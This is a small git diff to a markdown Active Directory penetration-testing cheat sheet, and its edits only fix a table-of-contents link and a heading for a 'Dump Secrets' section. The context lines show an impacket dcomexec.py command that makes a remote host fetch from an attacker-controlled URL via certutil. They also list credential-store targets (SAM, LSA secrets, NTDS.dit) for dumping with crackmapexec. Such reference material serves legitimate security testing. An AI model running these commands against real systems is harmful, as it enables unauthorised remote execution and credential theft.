@@ -62,7 +62,7 @@
 		- [Remote Management Users](#RemoteManagementUsers)
 		- [Server Operators](#ServerOperators)
 		- [Distributed COM Users](#DistributedCOMUsers)
-	- Dump Secrets:
+	- [Dump Secrets](#DumpSecrets):
 		- [SAM](#SAM)
 		- [LSA secrets](#LSAsecrets)
 		- [NTDS.dit](#NTDS.dit)
@@ -1282,9 +1282,10 @@ When analyzing a *BloodHound* graph, one may see from time to time an edge where
 Blind command execution - *dcomexec.py* Python script from *impacket* suite:
 - `python3 dcomexec.py -object MMC20 -silentcommand <DOMAIN>/<USERNAME>:<PASSWORD>@<IPTARGET> 'certutil -urlcache -f http://<IPATTACKERHTTP>/dcomTest'`
 
-# Dump Secrets
+# DumpSecrets
 
 There are a lot of *secrets* that can be dumped simply with *crackmapexec*. You can view all with `crackmapexec smb -L`.
+
 ## SAM
 
 **Requirements**:
